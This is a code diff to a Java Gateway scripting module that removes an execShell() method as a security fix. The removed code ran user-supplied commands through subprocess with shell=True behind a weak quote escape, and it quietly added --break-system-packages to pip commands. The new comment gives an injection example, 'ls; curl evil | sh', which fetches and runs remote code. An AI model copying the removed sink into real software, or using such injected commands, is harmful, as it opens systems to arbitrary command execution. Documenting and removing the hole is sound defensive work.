@@ -539,120 +539,20 @@ public class Python3ScriptModule implements Python3RpcFunctions {
         }
     }
 
-    /**
-     * Execute shell command on Gateway and return output.
-     *
-     * v2.5.0: Added for Shell Command mode in Designer IDE
-     *
-     * @param command Shell command to execute
-     * @return Map with stdout, stderr, exitCode
-     * @throws Exception if execution fails
-     */
-    public Map<String, Object> execShell(String command) throws Exception {
-        logger.info("execShell() called with command: {}", command);
-
-        try {
-            Python3ProcessPool pool = getProcessPool();
-            if (pool == null) {
-                String errorMsg = "Python 3 process pool is not initialized. Check Gateway logs for initialization errors.";
-                logger.error(errorMsg);
-                throw new RuntimeException(errorMsg);
-            }
-
-            logger.debug("Executing shell command via process pool");
-
-            // Borrow an executor from the pool
-            Python3Executor executor = pool.borrowExecutor(30, java.util.concurrent.TimeUnit.SECONDS);
-            if (executor == null) {
-                throw new RuntimeException("Failed to acquire Python executor from pool");
-            }
-
-            try {
-                // v2.5.4/v2.5.5: Auto-fix pip install commands for externally-managed environments (PEP 668)
-                // Detect pip install/uninstall commands and add --break-system-packages flag if needed
-                logger.info("execShell() - Original command: [{}]", command);
-
-                String processedCommand = command;
-                boolean isPipCommand = command.matches(".*\\bpip3?\\s+(install|uninstall)\\b.*");
-                boolean hasFlag = command.contains("--break-system-packages");
-
-                logger.info("execShell() - isPipCommand: {}, hasFlag: {}", isPipCommand, hasFlag);
-
-                if (isPipCommand && !hasFlag) {
-                    // Insert --break-system-packages after pip install/uninstall
-                    processedCommand = command.replaceFirst(
-                        "(pip3?\\s+(?:install|uninstall))",
-                        "$1 --break-system-packages"
-                    );
-                    logger.warn("AUTO-FIXED PIP COMMAND - Original: [{}]", command);
-                    logger.warn("AUTO-FIXED PIP COMMAND - Processed: [{}]", processedCommand);
-                } else if (isPipCommand) {
-                    logger.info("Pip command already has --break-system-packages flag");
-                }
-
-                // Execute shell command using Python subprocess
-                String pythonCode = String.format(
-                    "import subprocess\n" +
-                    "import json\n" +
-                    "try:\n" +
-                    "    result = subprocess.run(%s, shell=True, capture_output=True, text=True, timeout=30)\n" +
-                    "    output = {\n" +
-                    "        'stdout': result.stdout,\n" +
-                    "        'stderr': result.stderr,\n" +
-                    "        'exitCode': result.returncode\n" +
-                    "    }\n" +
-                    "except subprocess.TimeoutExpired:\n" +
-                    "    output = {\n" +
-                    "        'stdout': '',\n" +
-                    "        'stderr': 'Command timed out after 30 seconds',\n" +
-                    "        'exitCode': -1\n" +
-                    "    }\n" +
-                    "result = json.dumps(output)",
-                    escapeForPython(processedCommand)
-                );
-
-                Python3Result result = executor.execute(pythonCode, Collections.emptyMap(), "ADMIN");
-
-                if (result.isSuccess() && result.getResult() != null) {
-                    // Parse JSON result
-                    String jsonResult = result.getResult().toString();
-                    com.google.gson.JsonObject jsonObj = new com.google.gson.Gson().fromJson(jsonResult, com.google.gson.JsonObject.class);
-
-                    Map<String, Object> output = new HashMap<>();
-                    output.put("success", jsonObj.get("exitCode").getAsInt() == 0);
-                    output.put("stdout", jsonObj.get("stdout").getAsString());
-                    output.put("stderr", jsonObj.get("stderr").getAsString());
-                    output.put("exitCode", jsonObj.get("exitCode").getAsInt());
-
-                    logger.info("Shell command executed: exit code {}", output.get("exitCode"));
-                    return output;
-                } else {
-                    String errorMsg = "Shell command execution failed: " + result.getError();
-                    logger.error(errorMsg);
-
-                    Map<String, Object> output = new HashMap<>();
-                    output.put("success", false);
-                    output.put("stdout", "");
-                    output.put("stderr", result.getError() != null ? result.getError() : "Unknown error");
-                    output.put("exitCode", 1);
-                    return output;
-                }
-            } finally {
-                pool.returnExecutor(executor);
-            }
-
-        } catch (Exception e) {
-            logger.error("Failed to execute shell command", e);
-            throw e;
-        }
-    }
-
-    /**
-     * Escape string for use in Python code
-     */
-    private String escapeForPython(String str) {
-        return "'" + str.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n") + "'";
-    }
+    // execShell() / escapeForPython() were removed in this fix-pass (security finding C16).
+    //
+    // Rationale: the previous implementation interpolated a user-supplied command
+    // string into Python source code and executed it with `subprocess.run(<cmd>,
+    // shell=True, ...)`. The naive single-quote escape (only \\, ', \n) plus
+    // shell=True made it a classic shell-injection sink — submitting
+    //     command="ls; curl evil | sh"
+    // would run the second command as the Gateway service user.
+    //
+    // The corresponding Python feature was already removed from python_bridge.py
+    // (v2.9.0). Removing the Java entry-point closes the Jython-side
+    // `system.python3.execShell(...)` exposure as well.
+    //
+    // See /modules/.review/fixes/C16.md for the deprecation note.
 
     /**
      * Check if Python 3 is available and the process pool is healthy.
